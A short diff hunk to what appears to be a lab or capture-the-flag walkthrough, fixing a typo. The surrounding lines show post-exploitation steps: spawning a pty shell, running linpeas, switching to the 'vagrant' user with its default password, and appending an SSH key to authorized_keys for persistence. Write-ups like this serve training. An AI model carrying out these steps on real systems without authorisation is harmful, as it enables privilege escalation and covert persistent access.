@@ -308,7 +308,7 @@ $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@ubuntu-xenial:/tmp$ ./linpeas.sh -ar
 ```
 
-linpeas broke before trying to bruteforce using su. We can `su`as `vagrant` with the password `vagrant`.
+linpeas broke before trying to bruteforce using su. We can `su` as `vagrant` with the password `vagrant`.
 
 ```shell
 vagrant@ubuntu-xenial:~$ echo "my_ssh_rsa_public_key" >> ~/.ssh/authorized_keys
